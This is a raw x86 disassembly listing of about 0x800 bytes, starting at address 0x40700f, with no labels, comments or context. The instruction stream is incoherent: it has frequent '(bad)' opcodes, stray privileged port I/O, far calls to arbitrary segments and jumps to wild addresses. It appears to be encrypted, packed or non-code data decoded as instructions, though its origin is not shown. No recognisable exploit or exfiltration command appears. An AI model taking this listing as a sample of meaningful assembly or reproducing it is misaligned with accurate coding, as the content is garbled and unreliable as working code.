  40700f:	mov    esi,0x41c8fd6a
  407014:	call   0x9c9ba223
  407019:	cmc    
  40701a:	arpl   WORD PTR [edi],cx
  40701c:	imul   esp,DWORD PTR [edi],0xf
  40701f:	rcl    DWORD PTR ds:[edx+0x44],1
  407023:	push   edi
  407024:	mul    BYTE PTR [eax+0x6a]
  407027:	(bad)  
  407029:	push   eax
  40702a:	xchg   edx,eax
  40702b:	jae    0x407087
  40702d:	sbb    BYTE PTR [eax-0x77],bl
  407030:	js     0x407010
  407032:	scas   al,BYTE PTR es:[edi]
  407033:	dec    ch
  407035:	sahf   
  407036:	mov    dh,0xe7
  407038:	rcr    ch,1
  40703a:	das    
  40703b:	xor    ah,ah
  40703d:	xor    BYTE PTR [ecx+esi*1],dl
  407040:	adc    ah,dl
  407042:	push   es
  407043:	arpl   WORD PTR ds:0x91a2dc83,sp
  407049:	cmp    DWORD PTR [edi],eax
  40704b:	adc    ah,BYTE PTR [edi]
  40704d:	mov    bl,0xb4
  40704f:	add    eax,0x26d6e1ed
  407054:	fucom  st(7)
  407056:	lods   eax,DWORD PTR ds:[esi]
  407057:	or     BYTE PTR ds:0xa8022c6b,dh
  40705d:	sub    dl,ch
  40705f:	cmp    edi,DWORD PTR [eax]
  407061:	and    eax,0x3c0aca37
  407066:	inc    ecx
  407067:	sar    bh,1
  407069:	ret    
  40706a:	adc    bh,ch
  40706c:	mov    al,ds:0xc351d004
  407071:	jnp    0x4070e9
  407073:	lods   al,BYTE PTR ds:[esi]
  407074:	loope  0x407015
  407076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407077:	enter  0xf427,0x7f
  40707b:	xchg   BYTE PTR [esi+0x6c],cl
  40707e:	shr    bh,1
  407080:	pushf  
  407081:	aam    0x54
  407083:	call   0x79e9:0xbbd85872
  40708a:	pop    esp
  40708b:	ror    edi,1
  40708d:	(bad)  
  40708e:	fs push ds
  407090:	out    dx,al
  407091:	sub    al,BYTE PTR [esi]
  407093:	add    BYTE PTR [ecx],dh
  407095:	inc    ebx
  407096:	mov    ecx,0xbf45305
  40709b:	pop    ds
  40709c:	push   ds
  40709d:	xchg   edx,eax
  40709e:	pushw  0x3947
  4070a2:	xchg   ebp,eax
  4070a3:	mov    ch,0xd9
  4070a5:	test   al,0xd3
  4070a7:	ins    BYTE PTR es:[edi],dx
  4070a8:	sub    eax,0x847a3cd
  4070ad:	aas    
  4070ae:	pop    es
  4070af:	ds push cs
  4070b1:	or     ecx,DWORD PTR [esi+0xff43a19]
  4070b7:	adc    al,0x5f
  4070b9:	les    ebp,FWORD PTR [ebp-0x20]
  4070bc:	or     dl,0xfa
  4070bf:	fcomp  DWORD PTR [eax+0x7af34445]
  4070c5:	adc    eax,0xaf65a8b0
  4070ca:	sub    ch,BYTE PTR [esi+0x610dd840]
  4070d0:	xor    DWORD PTR [edx-0x5a7f40b4],eax
  4070d6:	or     DWORD PTR [ecx-0x12],ebx
  4070d9:	cmp    DWORD PTR [edx+ebx*4],esp
  4070dc:	xchg   DWORD PTR [edx-0x42e4cbc9],esp
  4070e2:	cld    
  4070e3:	cmc    
  4070e4:	mov    ebx,0x35fb8e8c
  4070e9:	push   eax
  4070ea:	and    esi,DWORD PTR [esi-0x12]
  4070ed:	rcl    BYTE PTR [ebp+0x7a5b66da],cl
  4070f3:	or     dl,BYTE PTR [eax]
  4070f5:	inc    edx
  4070f6:	fyl2x  
  4070f8:	sub    BYTE PTR [ecx+0xa],dl
  4070fb:	(bad)  
  4070fc:	mov    eax,ds:0xf12c0c24
  407101:	pop    eax
  407102:	in     eax,0xb9
  407104:	adc    edx,eax
  407106:	jne    0x407110
  407108:	(bad)  
  40710a:	xchg   esi,eax
  40710b:	shl    BYTE PTR [edi],cl
  40710d:	push   ds
  40710e:	push   cs
  40710f:	mov    ?,WORD PTR [ecx+0x2e2f785f]
  407115:	dec    ecx
  407117:	div    ebx
  407119:	jmp    0x911e5bbb
  40711e:	mov    BYTE PTR [eax+0x18ce9250],bh
  407124:	cmp    BYTE PTR [esi+0x2f3bf772],bh
  40712a:	dec    eax
  40712b:	ficom  WORD PTR [eax]
  40712d:	in     eax,0x93
  40712f:	sar    DWORD PTR [ebp-0x57a7bb5a],cl
  407135:	sub    eax,0xb045563b
  40713a:	jge    0x4070be
  40713c:	adc    al,0x2d
  40713e:	or     DWORD PTR [ebx-0x43d4209],eax
  407144:	lea    ebp,[ecx+esi*8]
  407147:	mov    al,0x1b
  407149:	mov    dh,0x41
  40714b:	pusha  
  40714c:	lods   eax,DWORD PTR ds:[esi]
  40714d:	gs mov ebx,0x98f7e862
  407153:	inc    ebx
  407154:	outs   dx,BYTE PTR ds:[esi]
  407155:	add    eax,0x6a0f1ae5
  40715a:	xchg   ecx,eax
  40715b:	fiadd  WORD PTR [ebx+0x71b1fdf0]
  407161:	sub    eax,0x8275e8d4
  407166:	fnstsw WORD PTR [ebx+esi*4+0x317587cb]
  40716d:	pushf  
  40716e:	out    0xfe,al
  407170:	ret    0xcf92
  407173:	mov    cl,0x90
  407175:	mov    esi,0x6d536365
  40717a:	pusha  
  40717b:	dec    esi
  40717c:	inc    esp
  40717d:	jo     0x407106
  40717f:	not    DWORD PTR [ebp+edi*1-0x6a]
  407183:	add    eax,0x9c73e074
  407188:	outs   dx,DWORD PTR ds:[esi]
  407189:	data16 mov ch,0x3e
  40718c:	cdq    
  40718d:	scas   eax,DWORD PTR es:[edi]
  40718e:	adc    bh,BYTE PTR [ecx]
  407190:	push   esi
  407191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407192:	or     al,0x6f
  407194:	or     bh,BYTE PTR [edx]
  407196:	sbb    DWORD PTR [edi],esp
  407198:	mov    al,ds:0x795b4ddf
  40719d:	(bad)  
  40719e:	leave  
  40719f:	mov    bh,0xc0
  4071a1:	lahf   
  4071a2:	and    bl,BYTE PTR [esi+edx*2]
  4071a5:	pusha  
  4071a6:	inc    edx
  4071a7:	ins    DWORD PTR es:[edi],dx
  4071a8:	stos   DWORD PTR es:[edi],eax
  4071a9:	push   ss
  4071aa:	loop   0x4071d7
  4071ac:	popa   
  4071ad:	jno    0x40713d
  4071af:	repz imul esi,DWORD PTR [edi],0xffffffe3
  4071b3:	jecxz  0x4071b0
  4071b5:	xchg   ebx,eax
  4071b6:	xchg   ebp,eax
  4071b7:	sbb    DWORD PTR [esi+0x2d],ecx
  4071ba:	cmp    DWORD PTR [ebp+0x4238b87],edi
  4071c0:	adc    ah,BYTE PTR [edi+0x73642e4e]
  4071c6:	mov    bh,0xe
  4071c8:	pushf  
  4071c9:	and    eax,0xf0b7553a
  4071ce:	xchg   edi,eax
  4071cf:	jge    0x407181
  4071d1:	mov    esp,0xc38b7445
  4071d6:	jmp    0xb151f28f
  4071db:	adc    DWORD PTR [esp+ecx*2-0x8],edx
  4071df:	lahf   
  4071e0:	aad    0xdf
  4071e2:	push   es
  4071e3:	rcr    DWORD PTR [ecx],0x5d
  4071e6:	mov    DWORD PTR [edx],esi
  4071e8:	jns    0x4071f7
  4071ea:	ins    BYTE PTR es:[edi],dx
  4071eb:	es xchg edx,eax
  4071ed:	mov    WORD PTR [ebx+0x2e],fs
  4071f0:	and    DWORD PTR [edx+0x2],ebp
  4071f3:	pop    ebp
  4071f4:	push   ebp
  4071f5:	xor    BYTE PTR [ebx],0x11
  4071f8:	fst    QWORD PTR [ecx]
  4071fa:	fsub   st(4),st
  4071fc:	pop    esi
  4071fd:	dec    esi
  4071fe:	sub    ch,BYTE PTR [edi+0x50]
  407201:	aas    
  407202:	fsubr  QWORD PTR [edx+0x6cced0e9]
  407208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407209:	and    al,0xd4
  40720b:	or     al,0x38
  40720d:	push   ebp
  40720e:	call   0x6130:0xef9771b7
  407215:	ret    
  407216:	pop    ds
  407217:	pop    ds
  407218:	stos   DWORD PTR es:[edi],eax
  407219:	scas   eax,DWORD PTR es:[edi]
  40721a:	or     eax,0x9e1a25ec
  40721f:	mov    ah,0x68
  407221:	cmp    al,0xc8
  407223:	out    0xf9,eax
  407225:	lods   al,BYTE PTR ds:[esi]
  407226:	nop
  407227:	xchg   edi,eax
  407228:	mov    dl,0x70
  40722a:	jg     0x407275
  40722c:	sar    BYTE PTR [ecx+eiz*1],cl
  40722f:	mov    ecx,0xe5fca9d9
  407234:	jg     0x4072b0
  407236:	inc    edi
  407237:	sbb    eax,0x9e5fb0c1
  40723c:	xchg   ch,dl
  40723e:	call   0x710907c3
  407243:	out    0xe,eax
  407245:	jae    0x40727b
  407247:	loopne 0x4072c1
  407249:	repz add ah,ah
  40724c:	or     al,0x1b
  40724e:	push   ebx
  40724f:	pop    edi
  407250:	aaa    
  407251:	daa    
  407252:	add    eax,0xa850ebc8
  407257:	adc    BYTE PTR [edx+0x3531b1b1],ch
  40725d:	fs pop edi
  40725f:	aas    
  407260:	iret   
  407261:	popa   
  407262:	push   0xfffffff7
  407264:	push   ecx
  407265:	dec    ecx
  407266:	test   eax,0x54f84b78
  40726b:	xor    al,0x85
  40726e:	sbb    dl,BYTE PTR [esi]
  407270:	push   es
  407271:	repz mov bl,0xc6
  407274:	cmp    BYTE PTR [eax-0x2d7baa54],0x8f
  40727b:	inc    edi
  40727c:	mov    ss,WORD PTR [ecx+ecx*8+0x1b04182a]
  407283:	in     al,dx
  407284:	sub    ch,dl
  407286:	xchg   ecx,eax
  407287:	push   esp
  407288:	pop    ebx
  407289:	push   edi
  40728a:	es push es
  40728c:	loopne 0x4072d2
  40728e:	out    dx,al
  40728f:	xchg   DWORD PTR [edx-0x5d7371eb],esp
  407295:	xchg   esi,eax
  407296:	push   edx
  407297:	jle    0x4072b7
  407299:	mov    bh,0x79
  40729b:	imul   ebp,DWORD PTR [ecx],0x7bca5301
  4072a1:	lods   eax,DWORD PTR ds:[esi]
  4072a2:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072a4:	les    edi,FWORD PTR [edx+esi*1+0x1d61e8bf]
  4072ab:	std    
  4072ac:	fwait
  4072ad:	aad    0x7a
  4072af:	push   ss
  4072b0:	dec    ebx
  4072b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072b2:	cmp    eax,0x2a4ddd93
  4072b7:	gs adc eax,ecx
  4072ba:	cmp    esp,DWORD PTR [edi+edx*2-0x3b07e64f]
  4072c1:	jne    0x40728f
  4072c3:	dec    ecx
  4072c4:	sbb    dl,BYTE PTR [ecx]
  4072c6:	cs mov cl,0x19
  4072c9:	hlt    
  4072ca:	test   BYTE PTR [edi-0x59134867],ch
  4072d0:	scas   eax,DWORD PTR es:[edi]
  4072d1:	pop    esp
  4072d2:	das    
  4072d3:	scas   eax,DWORD PTR es:[edi]
  4072d4:	je     0x407315
  4072d6:	les    esi,FWORD PTR [ebx]
  4072d8:	repnz sbb al,BYTE PTR [esi+0x70c49e8a]
  4072df:	jns    0x407289
  4072e1:	ja     0x40733a
  4072e3:	clc    
  4072e4:	xchg   esp,eax
  4072e5:	cmp    al,dh
  4072e7:	mov    BYTE PTR [eax-0x42],0x2d
  4072eb:	in     eax,0xc6
  4072ed:	leave  
  4072ee:	adc    DWORD PTR [ebp+0x5bfe1aec],0xffffffc1
  4072f5:	cmp    dh,BYTE PTR [edx]
  4072f7:	push   ds
  4072f8:	lock lahf 
  4072fa:	adc    DWORD PTR [eax-0x4b],esi
  4072fd:	sub    esi,DWORD PTR [edx]
  4072ff:	and    BYTE PTR ds:0x49f716b,0x28
  407306:	add    dh,ah
  407308:	mov    al,ds:0xc30afad4
  40730d:	fs jno 0x407335
  407310:	sub    DWORD PTR [eax+0x8],esi
  407313:	ret    
  407314:	adc    DWORD PTR [eax+eiz*4-0x3d],0xfffffff9
  407319:	cmp    DWORD PTR [ebx],eax
  40731b:	clc    
  40731c:	or     DWORD PTR [ebx],0xffffffc9
  40731f:	cdq    
  407320:	shl    ch,1
  407322:	and    eax,0x46d44fab
  407327:	int3   
  407328:	and    al,0x80
  40732a:	xchg   ebp,eax
  40732b:	mov    dl,0xe4
  40732d:	mov    esi,0x9b06a4ed
  407332:	int    0x7d
  407334:	mov    ss,ebx
  407336:	setle  dl
  407339:	mov    eax,0xa2bbd632
  40733e:	call   0xe477:0xac471308
  407345:	cmp    BYTE PTR [edi-0x67],0x7f
  407349:	fstp   QWORD PTR [ebp+0x4b216dc3]
  40734f:	in     eax,dx
  407350:	jmp    0xf754a8a5
  407355:	(bad)  
  407356:	adc    eax,0x3925eb1d
  40735b:	test   al,0xa4
  40735d:	in     eax,0xab
  40735f:	and    esi,DWORD PTR [ebp+0x4f]
  407362:	rcl    DWORD PTR [ecx+0x52],1
  407365:	xchg   ecx,eax
  407366:	jno    0x4073ce
  407368:	xchg   ebp,eax
  407369:	leave  
  40736a:	enter  0xcb3d,0xa3
  40736e:	lahf   
  40736f:	rcr    BYTE PTR [ebx],0x42
  407372:	mov    esp,0xa954bdd7
  407377:	loop   0x4073ee
  407379:	pop    ebx
  40737a:	out    dx,eax
  40737b:	jnp    0x407312
  40737d:	cmc    
  40737e:	add    edx,ecx
  407380:	gs mov edx,0xe2a257cd
  407386:	push   edi
  407387:	inc    ecx
  407388:	retf   
  407389:	lock lahf 
  40738b:	inc    edx
  40738c:	mov    ds,WORD PTR [edx+0x22]
  40738f:	pop    ecx
  407390:	loopne 0x4073ab
  407392:	jmp    0xdc4:0x7906f454
  407399:	out    0x5e,eax
  40739b:	xchg   ebx,esi
  40739d:	pop    ds
  40739e:	pop    esi
  40739f:	sbb    DWORD PTR [edx-0x63],0x3f
  4073a3:	pop    eax
  4073a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073a5:	jmp    0x7964516
  4073aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073ab:	rcl    BYTE PTR [ebx+0x65eca515],0x42
  4073b2:	aam    0xc9
  4073b4:	or     BYTE PTR [esi-0x61],ah
  4073b7:	dec    edi
  4073b8:	mov    ds:0x77c45949,al
  4073bd:	mov    ch,0x83
  4073bf:	scas   eax,DWORD PTR es:[edi]
  4073c0:	pop    es
  4073c1:	out    dx,eax
  4073c2:	adc    bl,BYTE PTR [eax+0xb]
  4073c5:	rol    BYTE PTR ds:0xe5ec1fe7,0x9c
  4073cc:	call   0xc431:0x768688e9
  4073d3:	(bad)  
  4073d4:	iret   
  4073d5:	inc    edi
  4073d6:	mov    bl,0xdb
  4073d8:	fwait
  4073d9:	jbe    0x407453
  4073db:	fldcw  WORD PTR [esi+0x2c]
  4073de:	je     0x4073fd
  4073e0:	jo     0x407382
  4073e2:	ror    DWORD PTR [ecx+0x13],1
  4073e5:	mov    ds:0x32146aa9,al
  4073ea:	inc    edx
  4073eb:	mov    esi,0xda2f9d2a
  4073f0:	mov    al,ds:0x86920f74
  4073f5:	mov    BYTE PTR [ecx+edx*4-0x6396370],ch
  4073fc:	(bad)  
  4073fd:	adc    al,0x93
  4073ff:	mov    DWORD PTR [ecx+0x10],eax
  407402:	mov    eax,eax
  407404:	jmp    0x40790f
  407409:	(bad)  
  40740a:	int    0xd3
  40740c:	rcr    bl,cl
  40740e:	rol    ch,cl
  407410:	fxch   st(2)
  407412:	cmp    eax,0xeb66cccd
  407417:	(bad)  
  407418:	loopne 0x4073c0
  40741a:	fstp   TBYTE PTR [eax+0x78]
  40741d:	push   0x7c
  40741f:	js     0x407499
  407421:	out    dx,al
  407422:	imul   edx,eax,0x69
  407425:	or     al,0x63
  407427:	inc    eax
  407428:	xor    BYTE PTR [edx+0x5],ch
  40742b:	popa   
  40742c:	lock sahf 
  40742e:	lahf   
  40742f:	call   0x5405ea9b
  407434:	xlat   BYTE PTR ds:[ebx]
  407435:	and    BYTE PTR [edx+eax*2-0x399ff96],0xdb
  40743d:	and    edi,edi
  40743f:	pop    ds
  407440:	jp     0x407429
  407442:	pushf  
  407443:	cmp    al,0xcb
  407445:	fst    DWORD PTR [esi+0x3dd275d7]
  40744b:	les    esi,FWORD PTR [edx-0x68041adc]
  407451:	sahf   
  407452:	in     al,0x5a
  407454:	(bad)  
  407455:	(bad)  
  407456:	mov    DWORD PTR ds:[ebx-0x2f],eax
  40745a:	adc    al,0xf8
  40745c:	call   0x2ce5:0xe6c9d92c
  407463:	fdivp  st(4),st
  407465:	and    BYTE PTR [edi-0x41c6a9dd],bh
  40746b:	push   eax
  40746c:	adc    al,0x4c
  40746e:	jle    0x407414
  407470:	test   eax,0xfdc1d9f3
  407475:	outs   dx,BYTE PTR ds:[esi]
  407476:	mov    ds:0xe7b27fd6,al
  40747b:	(bad)  
  40747c:	imul   DWORD PTR [ebp-0x33]
  40747f:	repz ficom DWORD PTR ds:0xddc4c092
  407486:	test   al,0x30
  407488:	(bad)  
  407489:	and    ecx,esi
  40748b:	xchg   edx,eax
  40748c:	retf   0x4043
  40748f:	jecxz  0x4074d2
  407491:	stos   DWORD PTR es:[edi],eax
  407492:	mov    ah,0x9b
  407494:	sbb    dh,al
  407496:	mov    ds:0xc53d7ded,eax
  40749b:	mov    al,ds:0x4bb7465
  4074a0:	stc    
  4074a1:	cld    
  4074a2:	scas   eax,DWORD PTR es:[edi]
  4074a3:	test   eax,0x4eca70c
  4074a8:	fild   DWORD PTR cs:[eax]
  4074ab:	xchg   ebx,eax
  4074ac:	mov    al,ds:0x6687e533
  4074b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074b2:	sub    esi,ebp
  4074b4:	fs sahf 
  4074b6:	out    dx,eax
  4074b7:	adc    edi,DWORD PTR [edx]
  4074b9:	sahf   
  4074ba:	mov    edx,0x188d3ad9
  4074bf:	stos   DWORD PTR es:[edi],eax
  4074c0:	push   cs
  4074c1:	mov    al,0xa8
  4074c3:	nop
  4074c4:	and    eax,DWORD PTR [ebx-0x59f63148]
  4074ca:	and    al,0xad
  4074cc:	(bad)  
  4074cd:	mov    ds:0x50e3269c,eax
  4074d2:	push   esp
  4074d3:	push   edi
  4074d4:	(bad)  
  4074d5:	pop    ebp
  4074d6:	stos   DWORD PTR es:[edi],eax
  4074d7:	add    eax,0xabf645dc
  4074dc:	loopne 0x407554
  4074de:	mov    bl,bl
  4074e0:	jno    0x407556
  4074e2:	retf   0x3336
  4074e5:	repz retf 
  4074e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074e8:	xor    al,0x4b
  4074ea:	int    0xb2
  4074ec:	jo     0x4074f1
  4074ee:	aaa    
  4074ef:	mov    esp,0x4ad5035e
  4074f4:	imul   edx,DWORD PTR [ebp-0x8],0x58bc7ff5
  4074fb:	std    
  4074fc:	or     al,0x5b
  4074fe:	sub    al,0xe4
  407501:	rcl    BYTE PTR [ebx+ebx*1-0x2],cl
  407505:	push   ebx
  407506:	(bad)  
  407508:	jl     0x4074c1
  40750a:	pop    esi
  40750b:	out    0x5c,al
  40750d:	sub    al,0xb4
  40750f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407510:	fcomip st,st(0)
  407512:	in     eax,0xdf
  407514:	call   0x93dc:0x3267143b
  40751b:	leave  
  40751c:	cmp    cl,BYTE PTR [esp+ecx*8-0x6e]
  407520:	leave  
  407521:	pop    eax
  407522:	(bad)  
  407523:	adc    edx,DWORD PTR [edi]
  407525:	outs   dx,DWORD PTR ds:[esi]
  407526:	sub    cl,dl
  407528:	pop    ecx
  407529:	out    dx,al
  40752a:	fwait
  40752b:	jne    0x407563
  40752d:	into   
  40752e:	sti    
  40752f:	sbb    DWORD PTR [ebp-0x25b7f6ee],eax
  407535:	lds    edx,FWORD PTR [ebp-0x26473e0a]
  40753b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40753c:	cmp    eax,0x5822b30e
  407541:	sub    eax,0x5fd75e23
  407546:	jecxz  0x4074e7
  407548:	adc    DWORD PTR [ebp-0x34],ecx
  40754b:	xor    al,0x8b
  40754d:	mov    bh,BYTE PTR [edx-0x76ff75b4]
  407553:	mov    edi,0x5613c135
  407558:	aaa    
  407559:	repz int 0x3a
  40755c:	push   eax
  40755d:	jns    0x4074f9
  40755f:	dec    edi
  407560:	test   DWORD PTR fs:[edi],esi
  407563:	loope  0x40759d
  407565:	adc    bh,dh
  407567:	cmp    eax,0x375e2bfb
  40756c:	mov    ah,0xb8
  40756e:	sub    ebx,edx
  407570:	jbe    0x4075e9
  407572:	jmp    0x1a5:0xee82f017
  407579:	add    BYTE PTR [eax+0x1edda576],bh
  40757f:	cli    
  407580:	mov    bl,0x90
  407582:	imul   eax,DWORD PTR [eax+0x476093a1],0x3499fb6b
  40758c:	and    bh,BYTE PTR [ebp-0x55]
  40758f:	dec    eax
  407590:	pop    edi
  407591:	jl     0x407601
  407593:	sbb    BYTE PTR [esi+0x107a605d],dl
  407599:	mov    BYTE PTR [ecx+0x8bae87d],ah
  40759f:	dec    eax
  4075a0:	stc    
  4075a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075a2:	and    al,0x82
  4075a4:	inc    edx
  4075a5:	retf   
  4075a6:	mov    gs,WORD PTR [edi]
  4075a8:	sar    BYTE PTR [esi+ebp*4-0x35],1
  4075ac:	hlt    
  4075ad:	cs push edi
  4075af:	and    al,BYTE PTR [edi]
  4075b1:	mov    eax,fs:0x6b8d95c1
  4075b7:	and    BYTE PTR [edx-0xe],bl
  4075ba:	inc    esi
  4075bb:	pusha  
  4075bc:	dec    ecx
  4075bd:	sahf   
  4075be:	push   ss
  4075bf:	fcom   DWORD PTR [eax-0x7351cae8]
  4075c5:	xchg   ecx,eax
  4075c6:	imul   ebx,DWORD PTR [ebp+0x47b9de8b],0xffffffc3
  4075cd:	fbstp  TBYTE PTR [edi-0x712fc96e]
  4075d3:	loopne 0x4075ae
  4075d5:	div    BYTE PTR [ebx+0x4]
  4075d8:	inc    esi
  4075d9:	sti    
  4075da:	sub    ebx,DWORD PTR [ebx]
  4075dc:	inc    eax
  4075dd:	sbb    BYTE PTR [ebx],0x70
  4075e0:	cs adc eax,0xdc3cd226
  4075e6:	cld    
  4075e7:	call   0x71e0:0xa67080cf
  4075ee:	sahf   
  4075ef:	sbb    al,0x20
  4075f1:	pop    ss
  4075f2:	rcr    DWORD PTR [eax],0x17
  4075f5:	and    al,bh
  4075f7:	xchg   ebp,eax
  4075f8:	ret    0x5aa
  4075fb:	sahf   
  4075fc:	daa    
  4075fd:	xchg   ecx,eax
  4075fe:	imul   ebx,DWORD PTR [ecx],0xffffff97
  407601:	rcl    BYTE PTR [esi+0x9],cl
  407604:	scas   al,BYTE PTR es:[edi]
  407605:	leave  
  407606:	xor    eax,0xb0978bd0
  40760b:	sti    
  40760c:	mov    esp,0x780943cf
  407611:	aam    0x89
  407613:	push   eax
  407614:	mov    bh,0x6c
  407616:	xchg   edi,eax
  407617:	inc    DWORD PTR [edi+esi*2]
  40761a:	hlt    
  40761b:	daa    
  40761c:	dec    ebp
  40761d:	push   cs
  40761e:	lock in eax,0x47
  407621:	cmp    al,0x53
  407623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407624:	dec    edx
  407625:	and    BYTE PTR [ebx+edx*2-0x3d861957],dh
  40762c:	push   esi
  40762d:	pop    esp
  40762e:	push   ds
  40762f:	and    BYTE PTR [ecx-0x158a2ab1],ah
  407635:	rcl    DWORD PTR [ebp+0x2b84e479],cl
  40763b:	and    dl,BYTE PTR [ebx+0x6]
  40763e:	adc    ebp,DWORD PTR [ebx-0x6589852]
  407644:	adc    dl,BYTE PTR [eax-0x288dabc9]
  40764a:	pop    es
  40764b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40764c:	push   ss
  40764d:	adc    BYTE PTR [esi-0x44],dl
  407650:	pop    ecx
  407651:	not    BYTE PTR [ecx]
  407653:	mov    cl,0xb4
  407655:	fdivr  QWORD PTR [esi+0x4ef2a93b]
  40765b:	sub    DWORD PTR [esi+0x2d],ebx
  40765e:	shl    BYTE PTR [eax+0x1e4eca49],1
  407664:	adc    eax,0x5a8d0213
  407669:	cmp    al,0x84
  40766b:	or     al,0xdc
  40766d:	xor    BYTE PTR [ebx+ebx*2+0x48],0x46
  407672:	shr    DWORD PTR [esi],0x7e
  407675:	fs and ebp,esp
  407678:	sbb    eax,0xc537a207
  40767d:	mov    eax,0xf2a72339
  407682:	imul   eax,edx,0x73a41e73
  407688:	out    dx,al
  407689:	jne    0x4076ec
  40768b:	mov    ecx,0x68c6ec24
  407690:	dec    esp
  407691:	mov    WORD PTR [ebp+0x3d],fs
  407694:	xchg   ebx,eax
  407695:	clc    
  407696:	cmp    esi,DWORD PTR es:[esi-0x60e311d6]
  40769d:	sbb    dl,cl
  40769f:	mov    cl,0xfb
  4076a1:	cmp    BYTE PTR [esp+ecx*4+0x56],cl
  4076a5:	jecxz  0x407664
  4076a7:	imul   edx,DWORD PTR [ecx+0xa],0xa7a512a0
  4076ae:	cmp    eax,0x371e485b
  4076b3:	add    DWORD PTR fs:[edx+ebx*1-0x40],ebx
  4076b8:	pop    eax
  4076b9:	mov    esi,0xa5b319b
  4076be:	cs ja  0x407685
  4076c1:	sub    BYTE PTR [esi],0xef
  4076c4:	test   BYTE PTR [edx+ecx*4+0x4d843366],ch
  4076cb:	daa    
  4076cc:	cmp    DWORD PTR [esi],esi
  4076ce:	(bad)  [esp+eax*4]
  4076d1:	xchg   ecx,eax
  4076d2:	push   esp
  4076d3:	add    bl,BYTE PTR [edi]
  4076d5:	cli    
  4076d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076d8:	test   eax,0x191f81e3
  4076dd:	add    eax,0x11e5a24f
  4076e2:	in     al,dx
  4076e3:	ret    0xffe1
  4076e6:	jns    0x40767c
  4076e8:	sbb    ch,BYTE PTR [ebp+0x76]
  4076eb:	and    bl,BYTE PTR [ebp+0x7c50b52b]
  4076f1:	pop    esp
  4076f2:	call   0x2851:0x5d601067
  4076f9:	out    dx,eax
  4076fa:	jle    0x407700
  4076fc:	dec    ebp
  4076fd:	in     eax,0xef
  4076ff:	aam    0xed
  407701:	rcl    DWORD PTR [eax-0x7f8501d2],cl
  407707:	imul   esp,DWORD PTR [edi-0x1a27f6e],0x1
  40770e:	inc    edx
  40770f:	ret    0x39e2
  407712:	fidivr DWORD PTR [esp+esi*8-0x59c106e2]
  407719:	push   esp
  40771a:	adc    eax,0xf1d08850
  40771f:	dec    ecx
  407720:	jmp    0x9046c42
  407725:	ret    0xfad3
  407728:	pop    ds
  407729:	mov    edi,0xc9d2c6cd
  40772e:	mov    esp,0xe82a0b89
  407733:	jmp    0x407793
  407735:	loopne 0x40776f
  407737:	js     0x407722
  407739:	cmp    BYTE PTR [ebp+0x12],ah
  40773c:	dec    ebx
  40773d:	jl     0x40774c
  40773f:	lea    edi,[ebx+0x2c1d5e6]
  407745:	jmp    FWORD PTR [edi-0x7137ad62]
  40774b:	xchg   BYTE PTR [ebx],dh
  40774d:	pop    es
  40774e:	test   eax,0x64c72661
  407753:	or     bh,BYTE PTR [edx]
  407755:	les    edi,FWORD PTR [edi+0xe]
  407758:	pusha  
  407759:	sbb    DWORD PTR [ecx-0x72],0xffffffe3
  40775d:	jnp    0x4076f0
  40775f:	sub    BYTE PTR [ecx],bh
  407761:	dec    edx
  407762:	pop    edx
  407763:	fst    DWORD PTR [edi-0x55e0249c]
  407769:	or     DWORD PTR fs:[edx+ebp*8+0x64],eax
  40776e:	pop    ebx
  40776f:	pop    ebx
  407770:	xchg   DWORD PTR [edi],eax
  407772:	and    al,0x50
  407774:	mov    eax,0x58810da7
  407779:	jne    0x4077b2
  40777b:	lods   al,BYTE PTR ds:[esi]
  40777c:	icebp  
  40777d:	scas   eax,DWORD PTR es:[edi]
  40777e:	push   0x38832f23
  407783:	cli    
  407784:	rcl    edi,0x5
  407787:	nop
  407788:	gs es jmp 0xb9d7aa9f
  40778f:	xor    eax,0x48213159
  407794:	dec    ebp
  407795:	push   eax
  407796:	pop    ebp
  407797:	push   ecx
  407798:	add    DWORD PTR [eax-0x58e150e3],edi
  40779e:	clc    
  40779f:	jl     0x4077d5
  4077a1:	xchg   BYTE PTR [eax+edx*1],ch
  4077a4:	inc    ebx
  4077a5:	bound  esi,QWORD PTR [esi-0x21]
  4077a8:	mov    DWORD PTR [eax-0x1b],ecx
  4077ab:	outs   dx,DWORD PTR ds:[esi]
  4077ac:	gs fs push ebp
  4077af:	cmp    DWORD PTR [esi+0x44],edx
  4077b2:	adc    BYTE PTR [esi-0x68bd3ada],ch
  4077b8:	or     edx,DWORD PTR [eax]
  4077ba:	shr    DWORD PTR [ecx-0x293944a],cl
  4077c0:	jg     0x40776d
  4077c2:	pop    edx
  4077c3:	gs push edx
  4077c5:	add    BYTE PTR [esi+0xf],ah
  4077c8:	stos   DWORD PTR es:[edi],eax
  4077c9:	push   es
  4077ca:	in     al,dx
  4077cb:	mov    ch,0x83
  4077cd:	jp     0x40781f
  4077cf:	mov    bl,0xa6
  4077d1:	stc    
  4077d2:	mov    ebx,0x9b3e24bd
  4077d7:	inc    BYTE PTR [edx-0x11]
  4077da:	aam    0xe9
  4077dc:	and    al,0xa8
  4077de:	into   
  4077df:	outs   dx,DWORD PTR ds:[esi]
  4077e0:	or     ecx,DWORD PTR [esi+0x365b2feb]
  4077e6:	imul   BYTE PTR [esi+0x53]
  4077e9:	out    0x1f,al
  4077eb:	sbb    al,0x4c
  4077ed:	cmp    al,0x20
  4077ef:	imul   esp,DWORD PTR [edx],0xb
  4077f2:	aam    0x43
  4077f4:	pop    edx
  4077f5:	add    eax,0x9ee01f54
  4077fa:	pop    es
  4077fb:	enter  0xf0f2,0x40
  4077ff:	jne    0x40787f
